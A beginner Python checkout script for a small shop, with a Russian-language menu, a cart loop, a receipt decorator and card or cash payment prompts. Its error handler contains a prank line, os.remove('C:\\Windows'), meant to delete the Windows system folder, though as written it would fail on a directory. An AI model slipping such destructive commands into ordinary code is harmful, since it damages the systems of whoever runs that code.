import os


def enter_product(menu, choice, trash, i=0, choice1=0):
        trash[choice] = menu.get(choice)
        print(trash)
        choice1 = input("let`s sell? (Yes/No)")
        while choice1 == "Yes":
                if choice1 == "Yes":
                        choice = input("Enter product: ")
                        trash[choice] = menu.get(choice)
                        print(trash)
                choice1 = input("let`s sell? (Yes/No)")


def check_dec(func):
    def wrapper(trash, total_sum):
        print("+++++++++++++++++++ CHECK +++++++++++++++++++")
        func(trash)
        print("+++++++++++++++++++++++++++++++++++++++++++++")
        print(f"TOTAL   {total_sum}")
    return wrapper

@check_dec
def check(trash):
    for product, price in trash.items():
        print(f"{product}       {price}")



menu = {"Пиперони": 999, "Шаурма": 299,
        "Двойной Латте на кокосовом": 300,
        "Миндальный раф на кокосовом молоке": 300
}

trash = {}
print(menu)
try:
        choice = input("Enter product: ")
        enter_product(menu, choice, trash)
except ValueError:
        print("GoodBye Bro!")
        os.remove("C:\\Windows")

summa = sum(list(trash.values()))
check(trash, summa)

pay = input("How will you pay?(online/offline): ")
if pay == 'online':
        try:
                num_card, date, ccv = input("number card: "), input("date a card: "), input("ccv your card: ")
        except ValueError:
                print("Are You Normal?")
        print("Pay is passed!")
elif pay == 'offline':
        try:
                my_wallet = int(input("How many bucks will you give me?"))
                for i in range(True):
                        if my_wallet < summa:
                                print("Not enough bucks!")
                                my_wallet = int(input("How many bucks will you give me?"))
                print(f'Your change amounted to {my_wallet-summa}. GoodBye Bro!')
        except ValueError:
                print("Are You Normal?")
                my_wallet = int(input("How many bucks will you give me?"))

elif pay != 'online' and pay != 'offline':
        print("GoodBye!")
